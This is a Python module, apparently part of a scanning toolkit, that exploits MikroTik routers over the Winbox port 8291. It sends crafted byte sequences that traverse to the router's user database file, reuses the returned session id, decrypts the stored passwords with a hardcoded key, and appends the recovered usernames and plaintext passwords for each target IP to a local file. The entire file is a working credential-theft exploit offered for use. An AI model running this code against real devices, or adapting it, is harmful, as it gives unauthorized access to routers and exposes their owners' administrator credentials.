import re
import hashlib
import socket
from logging import DEBUG
from utils.helpers import setup_logger

logger = setup_logger()


class Mikrotik:
    def __init__(self, **opt):
        self.debug = opt.get('debug') or False
        self.output = opt.get('output') or 'mikrotik_users.txt'
        self.timeout = opt.get('timeout') or 3

        self.init()

    def init(self):
        if self.debug:
            logger.setLevel(DEBUG)

    def check(self, ip):
        logger.info('Trying to exploit %s' % ip)

        a = [0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
             0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
             0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
             0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
             0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
             0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
             0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
             0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
             0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
             0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
             0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
             0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
             0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
             0x00, 0x00]

        b = [0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
             0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
             0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
             0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
             0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
             0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
             0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
             0x00, 0x02, 0x00, 0x00, 0x00]

        port = 8291
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        result = sock.connect_ex((ip, port))

        if result == 0:
            # Convert to bytearray for manipulation
            a = bytearray(a)
            b = bytearray(b)
            # Send hello and recieve the sesison id
            sock.send(a)

            try:
                d = bytearray(sock.recv(1024))
            except Exception as e:
                logger.error(e)
                return False

            # Replace the session id in template
            try:
                b[19] = d[38]
            except Exception as e:
                logger.error(e)
                return False

            # Send the edited response
            sock.send(b)
            try:
                d = bytearray(sock.recv(1024))
            except Exception as e:
                logger.error(e)
                return False

            # Get results
            self.dump(d[55:], ip)

        else:
            logger.info('Failed - %s' % ip)
            logger.debug('Socket response: %s' % str(result))
            return False

    def dump(self, data, ip):
        user_pass = self.get_pair(data)

        if user_pass:
            list_users = []
            for users in user_pass:
                u, p = users
                if u and p:
                    list_users.append(users)

            if list_users:
                list_users = list(dict.fromkeys(list_users))

                line_space = '/' * 32
                result = '%s\n' % line_space
                result += '// IP   : %s\n' % str(ip)
                result += '// %s\n' % ('-' * 29)
                result += '// \n'.join(['// User : %s\n// Pass : %s\n' % (u, p) for u, p in list_users])
                result += '%s\n' % line_space
                result.encode("utf-8")

                with open(self.output, 'a') as fp:
                    fp.write(result)

                logger.info('Got Users from %s\n%s' % (str(ip), result))

    # noinspection PyMethodMayBeStatic
    def decrypt_password(self, user, pass_enc):
        key = hashlib.md5(user + b'283i4jfkai3389').digest()

        passw = ''
        for i in range(0, len(pass_enc)):
            key_index = key[i % len(key)]
            if not isinstance(key_index, int):
                key_index = ord(key_index)

            passw += chr(pass_enc[i] ^ key_index)

        return passw.split('\x00')[0]

    # noinspection PyMethodMayBeStatic
    def extract_user_pass(self, entry):
        user_data = entry.split(b'\x01\x00\x00\x21')[1]
        pass_data = entry.split(b'\x11\x00\x00\x21')[1]

        user_len = user_data[0]
        pass_len = pass_data[0]

        username = user_data[1:1 + user_len]
        password = pass_data[1:1 + pass_len]

        return username, password

    def get_pair(self, data):
        user_list = []

        entries = data.split(b'M2')[1:]
        for entry in entries:
            try:
                user, pass_encrypted = self.extract_user_pass(entry)
            except Exception as err:
                logger.debug(err)
                continue

            pass_plain = self.decrypt_password(user, pass_encrypted)
            if re.search(r'[\x80-\xff]', pass_plain):
                continue

            try:
                user = user.decode('ascii')
            except Exception as err:
                logger.debug(err)
                continue

            if re.search(r'[\x80-\xff]', user):
                continue

            user_list.append((user, pass_plain))

        return user_list
